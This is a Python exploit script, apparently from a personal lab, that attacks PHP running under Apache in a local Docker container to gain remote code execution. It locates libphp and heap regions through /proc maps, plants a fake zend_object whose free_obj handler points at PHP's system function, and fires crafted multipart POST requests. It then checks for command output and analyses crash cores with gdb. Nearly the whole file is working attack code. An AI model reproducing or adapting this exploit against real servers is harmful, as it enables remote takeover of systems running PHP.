#!/usr/bin/env python3
"""oom95: single-boot shot with the corrected region picker.

Laws (measured oom93-B core decode + all boots tonight):
  - pattern sits at R+0x1718 in EVERY content region; content regions are
    mmap'd at 0x7f... (brk arena 0x55... is Apache's own, NOT content).
  - part 0's copy = first region R1; object at R1+0x1718+176.
  - pointer uniform (8-periodic) -> zval ti at [S+8] = low32(OBJ) ->
    suffix 0x17C8 -> type 8 + refcounted bit: TRUE in every 2MB-aligned
    region (R low 21 bits zero) -> dispatch condition boot-independent.
  - oom93-B proved the walk reads the planted pointer (rdi = planted OBJ).
  - zend_object.handle @ +8 (gc head = 8B) — source-verified.
  - ti=0x108 (DESTRUCTOR_CALLED set, FREE_CALLED clear) -> free_obj fires.
Picker: anon rw-p, size >= 1MB, va >= 0x7f0000000000, FIRST match.
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_maps():
    pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
    maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
    base = None
    region = None
    for ln in maps.splitlines():
        a = ln.split()
        if "libphp.so" in ln and len(a) > 1 and a[1].startswith("r") and base is None:
            base = int(a[0].split("-")[0], 16)
        if (len(a) > 1 and a[1].startswith("rw") and region is None):
            rng = a[0].split("-")
            va = int(rng[0], 16)
            sz = int(rng[1], 16) - va
            if sz >= 0x100000 and va >= 0x7F0000000000 and (len(a) < 6 or not a[5].startswith("/")):
                region = va
    return base, region


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def obj_block(OBJ, free_obj):
    B = bytearray(176)
    struct.pack_into("<II", B, 0x00, 1, 0x108)      # rc, ti
    struct.pack_into("<I", B, 0x08, 1)              # handle (offset 8)
    struct.pack_into("<Q", B, 0x10, 0)              # ce (never read)
    struct.pack_into("<Q", B, 0x18, OBJ + 0x38)     # handlers -> T2
    struct.pack_into("<I", B, 0x2C, 1)              # frame num_args
    struct.pack_into("<Q", B, 0x38, 0)              # T2.offset
    struct.pack_into("<Q", B, 0x40, free_obj)       # free_obj
    struct.pack_into("<Q", B, 0x50, OBJ + 0x68)     # argz.value -> gs
    struct.pack_into("<I", B, 0x58, 6)              # IS_STRING
    struct.pack_into("<IIQI", B, 0x68, 1, 0x106, 0, len(CMD))
    B[0x80:0x80 + len(CMD)] = CMD
    B[0x80 + len(CMD)] = 0
    return bytes(B)


def chooser(libphp_base, VA0, free_obj):
    OBJ = VA0 + 176
    ob = obj_block(OBJ, free_obj)
    pt = struct.pack("<Q", OBJ) * 192 + b"A"

    def vt(i):
        v = bytearray(pt)
        if OBJ + 176 <= len(v):
            v[176:176 + 176] = ob
        return bytes(v)
    return vt


def check_x():
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    return "No such" not in x, x


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c95_%s" % tag, 240)
    sh("docker cp /tmp/c95_%s phpbuild:/tmp/c95_%s" % (tag, tag), 240)
    return "/tmp/c95_%s" % tag


def gdb_regs(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi rip\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    rdi = rip = None
    m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    if m:
        rdi = int(m.group(1), 16)
    m = re.search(r"rip\s+0x([0-9a-f]+)", out)
    if m:
        rip = int(m.group(1), 16)
    return rdi, rip


def arm_and_shoot(tag, vt):
    for i, k1 in enumerate(P.K1S[:-1]):
        post(P.build_attack(k1, 9100000 + i * 100000, value_tile=vt))
        hit, x = check_x()
        if hit:
            return ("x", x)
    post(P.build_attack(3400, 9200000, value_tile=vt))
    hit, x = check_x()
    if hit:
        return ("x", x)
    for fi in range(3):
        sb = 9210000 + fi * 4
        code, resp = post(P.build_attack(3400, sb, value_tile=vt))
        t2 = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
        print("  [%s] fire%d (%d): %s [%s]" % (tag, fi, sb, code, t2), flush=True)
        time.sleep(2)
        hit, x = check_x()
        if hit:
            return ("x", x)
        if code != "200":
            time.sleep(3)
            cb = fetch_core("%s%d" % (tag, fi))
            rdi, rip = gdb_regs("c95_%s%d" % (tag, fi))
            return ("crash", rdi, rip, cb)
    return ("silent",)


boot = 0
won = False
while boot < 3 and not won:
    print("=== boot %d ===" % boot, flush=True)
    boot_core_env()
    base, region = boot_maps()
    assert base and region, (base, region)
    VA0 = region + 0x1718
    OBJ = VA0 + 176
    print("    libphp=0x%x R1=0x%x VA0=0x%x OBJ=0x%x" % (base, region, VA0, OBJ), flush=True)
    low32 = OBJ & 0xFFFFFFFF
    print("    zval-ti = 0x%08x -> type=%d refc=%d" % (low32, low32 & 0xF, (low32 >> 8) & 1), flush=True)
    assert low32 & 0xF == 8 and (low32 >> 8) & 1 == 1, "ti condition failed this boot"
    vt = chooser(base, VA0, base + ZIF_SYSTEM)
    r = arm_and_shoot("b%d" % boot, vt)
    if r[0] == "x":
        print("    /tmp/x: [%s]" % r[1], flush=True)
        print("*** RCE CONFIRMED ***", flush=True)
        won = True
        break
    if r[0] == "crash":
        rdi, rip = r[1], r[2]
        d = (rdi or 0) - OBJ
        print("    crash rdi=0x%x rip=0x%x rdi-OBJ=%s core=%s" % (rdi or 0, rip or 0, d, r[3]), flush=True)
    else:
        print("    silent boot — reboot and retry", flush=True)
    boot += 1

print("[restore]", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
